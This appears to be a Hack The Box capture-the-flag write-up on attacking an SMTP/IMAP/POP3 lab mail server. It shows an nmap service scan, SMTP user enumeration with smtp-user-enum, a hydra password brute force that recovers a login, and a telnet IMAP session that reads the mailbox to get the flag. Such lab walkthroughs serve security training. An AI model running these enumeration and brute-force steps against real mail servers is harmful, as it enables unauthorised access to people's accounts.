# SMTP

### What is the available username for the domain inlanefreight.htb in the SMTP server?

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.203.12
PORT    STATE    SERVICE VERSION
25/tcp  open     smtp    hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp open     pop3    hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
143/tcp open     imap    hMailServer imapd
|_imap-capabilities: IMAP4 RIGHTS=texkA0001 ACL OK CHILDREN IMAP4rev1 completed CAPABILITY IDLE QUOTA NAMESPACE SORT
465/tcp filtered smtps
587/tcp open     smtp    hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp filtered imaps
995/tcp filtered pop3s
Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows
```

lets enumerate

```bash
smtp-user-enum -M RCPT -U HTB/users.list -D inlanefreight.htb -t 10.129.47.111 -w 15 -v
10.129.47.111: marlin@inlanefreight.htb exists
```

now lets brute force our way in

```bash
hydra -l marlin@inlanefreight.htb -P HTB/passwords.list -f 10.129.47.111 pop3
#[110][pop3] host: 10.129.47.111   login: marlin@inlanefreight.htb   password: poohbear
```

now lets use telnet to connect mail server

```bash
#i choose imap
telnet 10.129.248.242 143
1 LOGIN marlin@inlanefreight.htb poohbear
1 LIST "" *
1 SELECT INBOX
1 FETCH 1 all
1 FETCH 1 BODY[]
flag: HTB{w34k_p4$$w0rd}
```

flag: HTB{w34k\_p4\$$w0rd}
